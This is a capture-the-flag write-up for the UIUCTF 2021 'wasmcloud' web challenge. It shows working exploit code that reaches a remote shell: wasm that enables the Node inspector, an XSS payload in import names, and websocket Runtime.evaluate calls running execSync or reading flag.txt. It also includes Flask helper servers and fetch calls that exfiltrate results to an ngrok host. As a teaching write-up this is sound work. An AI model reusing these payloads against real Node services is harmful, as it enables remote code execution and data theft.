--
title: UIUCTF 2021 - wasmcloud
author: sera
categories: web
layout: post
---

> wasm... as a service!
>
> http://wasmcloud.chal.uiuc.tf
> HINT: They say to focus on the process, not the outcome
> author: kuilin
> 
> [handout.tar.gz](https://uiuc.tf/files/8120a81b776978e5307bf33845e0bcb8/handout.tar.gz)

# wasmcloud (Web, unsolved during CTF)

This web challenge is a service that runs some user's webassembly (wasm) on the server. The flag is inside a nsjail (a secure sandbox) with the process actually running the webassembly - however, wasm does not provide any way of communicating with anything besides imports. Handout contains Dockerfile and source code.

Shoutouts to nope for writing the webassembly for this challenge and the rest of my teammates for helping bounce ideas.

## Service Description
The challenge is not that big, but there are a few confusing parts.

First, I'll discuss what happens when you press the "run" button on the site:

![image of site](/uploads/2021-08-03/wasmcloud1.png)
![output](/uploads/2021-08-03/wasmcloud2.png)

- Our input wasm text is compiled locally.
- Our input is POSTed to /upload in binary form. The endpoint returns a 16 byte hex string representing the file's path.
- The page GETs /run/(id).wasm and alert()s the response.
- On the server itself, the /run/ endpoint:
    - Verifies the pathname is valid (16 hex characters .wasm)
    - Inserts itself into a job queue and waits
    - Spawns a nsjail process that runs a script to run the actual wasm
    - Connects stdout, stderr, and exit code to the response of the endpoint
    - Waits until it exits
- The actual sandbox:
    - Instantiates the webassembly and calls main(). The whole process module is imported.
    - Gets killed by nsjail after 1 second

Along with the ability to run wasm, we have an admin bot. This might seem weird since the flag is on disk and not in admin cookies. Nevertheless, we can run it with the /report endpoint.

The /report endpoint just attempts to verify the URL and captcha then spawns the admin bot. The admin bot is on localhost and will only visit http(s) URLs. It has no cookies and does nothing besides visit the page and wait 10 seconds.

## Solving

The first bug I noticed was the URL validation in the /report endpoint was useless. Here is the corresponding code:

```js
// assume url is to wasmcloud (client checks it, so there should be no confusion)
const url = "http://127.0.0.1:1337" + new URL(req.body.url).pathname;
spawn("node", ["bot.js", req.body.url]);
```

The `url` variable is constructed, but not actually used, and client side checking is meaningless when we can send whatever we want to the server. We are able to inject a parameter, to spawn but unfortunately node will *not* parse any arguments after the script name directly and forward them to the script. This means the only result of this bug is we can pass any http(s) to the bot, which still seems better.

(I only knew this after solving, but this bug is a bit useless and only forces you to write the URL with correct port out yourself along with disabling the client side validation. The extended body parser is also enabled for this endpoint but I don't think it allows anything interesting.)

The next thing I noticed was the _whole_ process module is imported into your wasm, so you can call any function in the module that takes a wasm type. However, wasm seems to have a limit of a 2 level namespace, so we can only call something like `process.x` and not `process.x.y`. In addition, we cannot read variables off the imported module.

If we consult the [node documentation](https://nodejs.org/docs/latest-v14.x/api/process.html), it looks like there is nothing really useful. But we know better to trust documentation. We can simply type `process` into a node instance to see what top level functions are avaliable to us.

```
> process
process {
  _rawDebug: [Function: _rawDebug],
  binding: [Function: binding],
  _linkedBinding: [Function: _linkedBinding],
  dlopen: [Function: dlopen],
  uptime: [Function: uptime],
  _getActiveRequests: [Function: _getActiveRequests],
  _getActiveHandles: [Function: _getActiveHandles],
  reallyExit: [Function: reallyExit],
  _kill: [Function: _kill],
  hrtime: [Function: hrtime] { bigint: [Function: hrtimeBigInt] },
  cpuUsage: [Function: cpuUsage],
  resourceUsage: [Function: resourceUsage],
  memoryUsage: [Function: memoryUsage],
  kill: [Function: kill],
  exit: [Function: exit],
  openStdin: [Function],
  getuid: [Function: getuid],
  geteuid: [Function: geteuid],
  getgid: [Function: getgid],
  getegid: [Function: getegid],
  getgroups: [Function: getgroups],
  assert: [Function: deprecated],
  _fatalException: [Function],
  setUncaughtExceptionCaptureCallback: [Function],
  hasUncaughtExceptionCaptureCallback: [Function: hasUncaughtExceptionCaptureCallback],
  emitWarning: [Function: emitWarning],
  nextTick: [Function: nextTick],
  _tickCallback: [Function: runNextTicks],
  _debugProcess: [Function: _debugProcess],
  _debugEnd: [Function: _debugEnd],
  _startProfilerIdleNotifier: [Function: _startProfilerIdleNotifier],
  _stopProfilerIdleNotifier: [Function: _stopProfilerIdleNotifier],
  abort: [Function: abort],
  umask: [Function: wrappedUmask],
  chdir: [Function],
  cwd: [Function: wrappedCwd],
  initgroups: [Function: initgroups],
  setgroups: [Function: setgroups],
  setegid: [Function],
  seteuid: [Function],
  setgid: [Function],
  setuid: [Function],
```

That's a bit better. We can see quite a few undocumented functions, and as the hint says `They say to focus on the process, not the outcome`, we can assume that we should investigate these.

One of the more interesting functions is `binding`. If we try it in our node shell, it turns out this functions like `require` and will return a module based on its argument. However this turns out to be a dead end for two reasons:

- wasm does not have the concept of a string
- As far as I know, we can't handle the returned module (maybe it's possible to do something with the feature called tables?)

The functions emitWarning and _fatalException can print to stderr but again we can't pass in strings.

Note: This is as far as I got during the actual CTF since I had a lot else to work on but I came back to it after pwnyIDE was solved.

At this point I took a step back and analyzed the actual nsjail configuration:
```js
const proc = spawn("nsjail", [
    "-Mo", "-Q", "-N", "--disable_proc",
    "--chroot", "/chroot/",
    "--time_limit", "1",
    "--",
    "/usr/local/bin/node", "/sandbox.js"
]);
```

There are quite a few short flag names. `-Mo` means execve once, `-Q` means quiet, and `-N` causes... the host network to be bridged? This made me think we were expected to somehow start a server inside the jail that the admin bot could connect to - since we bypassed the port filter and all.

As it turns out, the _debugProcess(pid) function starts a debug server!
```
> process._debugProcess(0)
Debugger listening on ws://127.0.0.1:9229/d393084e-b372-407c-972d-cb130dd35d4a
For help, see: https://nodejs.org/en/docs/inspector
```

The documentation states `a malicious actor able to connect to this port may be able to execute arbitrary code on behalf of the Node.js process`. This sounds perfect, but it's a websocket server and requires a random uuidv4.

After doing some googling, I found out this port also runs a few [HTTP endpoints](https://github.com/nodejs/node/blob/master/src/inspector_socket_server.cc#L324) including `/json/list`, which returns the full websocket URL to conncect to the debugger:
```
[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=localhost:9229/d393084e-b372-407c-972d-cb130dd35d4a",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=localhost:9229/d393084e-b372-407c-972d-cb130dd35d4a",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "d393084e-b372-407c-972d-cb130dd35d4a",
  "title": "/snap/node/5146/bin/node[11082]",
  "type": "node",
  "url": "file://",
  "webSocketDebuggerUrl": "ws://localhost:9229/d393084e-b372-407c-972d-cb130dd35d4a"
} ]
```

Looks great, but we can't connect to this by sending the admin bot to a page on our server because it's a different host. There's actually 2 CVEs related to this where you could use DNS rebinding, but that has been fixed in the version on the server.

I started to look for places to do XSS and found a suspicious line near the top of the server:
```js
app.use(function (req, res, next) {
    res.header("Content-Type", "text/html");
    next();
});
```

This forces all responses to be rendered by the server even if the browser would usually sniff them out as a different content type. Since our wasm output is connected to /run/, I thought it would be possible to have the wasm just print out the string and get XSS that way, but turns out it's a dead end because wasm cannot pass a string to `process.emitWarning`, and we can't access `process.stdout.write` even though it would take a buffer.

However, I realized we could use the compiler error messages. Trying to import a function that fails will print its name to stdout. For example, if we upload the following and visit its /run/ page directly, we will get an alert popup.
```
(module
  (import "process" "<script>alert(1)</script>" (func $return (param i32)))
  (func (export "main") (local $meme1 i32)
    i32.const 69420
    call $return
  )
)
```

So we can construct a simple payload that fetches /list/ and then contact the websocket to get access. [This page](https://blog.ssrf.in/post/cve-2018-7160-chrome-devtools-protocol-memo/) describes a simple payload for the node debugger protocol that will execute some code.
```js
const f = async (url) => {
    while(true) {
        try {
            return await fetch(url, options);
        } catch (err) {
            await new Promise(r => setTimeout(r, 100));
        }
    }
};
async function g(){
    let a;
    await f(`http://localhost:9229/json/list`).then(r=>r.json()).then(d=>{a=d});
    let s = new WebSocket(`${a[0][webSocketDebuggerUrl]}`);
    s.onopen = function() {
        data = `require = process.mainModule.require; execSync = require('child_process').execSync; execSync('cat flag.txt');`;
        s.send(JSON.stringify({'id':1,'method':'Runtime.evaluate','params':{'expression': data}}));
    };
    s.onmessage = function (event) {
        fetch(`https://server/?`+btoa(event.data));
    };
};
g();
```

My idea here was just to keep calling /json/list until a server happens to be up and use it. I asked nope to write some webassembly that just calls `_debugProcess`, brute forcing the PID, and spins a loop at this point and here's what he came up with:

```
(module
  (import "process" "exit" (func $return (param i32)))
  (import "process" "_debugProcess" (func $enable (param i32)))
  (func (export "main") (local $meme1 i32)
    i32.const 0
    set_local $meme1
    
    loop $B0
      get_local $meme1
      call $enable
      get_local $meme1
      i32.const 1
      i32.add
      set_local $meme1
      get_local $meme1
      i32.const 9999
      i32.ne
      br_if $B0
    end
    
    loop $B1
      i32.const 1
      i32.const 2
      i32.add
      br $B1
    end

    i32.const 69420
    call $return
  )
)
```

At this point I'm thinking I have all the parts - here's what we'll do:
- Submit the stored XSS
- Send the admin bot to the stored XSS
- Spam run the wasm to run the debug process
- Wait for the flag delivery

I try it, and it doesn't work (what did you expect?). I then remember that a different port is not same origin, something I really should know. So we need to find a new method to get the websocket URL. The URL is printed out, but since we only get the output after calling /run/, that's too late, right? Well, since the response is returned chunked, it turns out we can read the webstocket URL that was sent to stderr before the server closes.

However, to get the timing to behave, we'll need to spin up a small http server ourselves that starts the wasm and returns a websocket URL on being called;

Here's the one I made:
```python
from flask import Flask
import requests
from pwn import *
from flask_cors import CORS, cross_origin
app = Flask(__name__)
cors = CORS(app)
app.config['CORS_HEADERS'] = 'Content-Type'

def make_r():
    r = remote("wasmcloud.chal.uiuc.tf", 80)
    r.sendline(b"GET /run/your-wasm-hash.wasm HTTP/1.1\r\n")
    uuid = r.recv(1024).decode().split(" ")[-4].split("\n")[0]
    # Im lazy
    return uuid

@app.route("/")
@cross_origin()
def hello_world():
    return make_r()

app.run(port=8080)
```

And the corresponding js:
```js
async function g(){
    let a;
    await fetch(`http://server.ngrok.io/`).then(r=>r.text()).then(d=>{a=d});
    console.log(a);
    let s = new WebSocket(a);
    s.onopen = function() {
        data = `(eval payload)`;
        s.send(JSON.stringify({'id':1,'method':'Runtime.evaluate','params':{'expression': data}}));
    };
    s.onmessage = function (event) {
        fetch(`http://server.ngrok.io/?`+btoa(event.data));
    };
};
g();
```

I run this and get... a ulimit error from spawning a child. Great. After changing the payload and resubmitting the captcha few times, we get the flag with `require = process.mainModule.require;fs = require('fs');fs.readFileSync('flag.txt').toString();`:

`uiuctf{https://youtu.be/17ocaZb-bGg}`

## Things after solving
The XSS bug was actually completely unneccessary because wasm does not have the concept of a same origin policy, so we could have send the admin to our server and have that return the script too - here's a sample server that does that:

```python
from flask import Flask
import requests
import http.client
from pwn import *
from flask_cors import CORS, cross_origin
app = Flask(__name__)
cors = CORS(app)
app.config['CORS_HEADERS'] = 'Content-Type'

def make_r():
    print("make_r: hi")
    r = remote("wasmcloud.chal.uiuc.tf", 80)
    r.sendline(b"GET /run/a9323890b8db4c5a.wasm HTTP/1.1\r\n")
    uuid = r.recv(1024).decode().split(" ")[-4].split("\n")[0]
    return uuid

@app.route("/")
@cross_origin()
def hello_world():
    uuid = make_r()
    s = """<!DOCTYPE html><script>
async function g(){
    let s = new WebSocket("%s");
    s.onopen = function() {
        data = `require = process.mainModule.require;fs = require('fs');fs.readFileSync('flag.txt').toString();`;
        s.send(JSON.stringify({'id':1,'method':'Runtime.evaluate','params':{'expression': data}}));
    };
    s.onmessage = function (event) {
        fetch(`http://server.ngrok.io/?`+btoa(event.data));
    };
};
g();
</script>""" % uuid
    return s

app.run(port=8080)
```
Submitting your ngrok URL with this to the admin bot is enough to get the flag.

We also could have just had the XSS script fetch /run/ itself, but I don't wanna make a PoC for this.
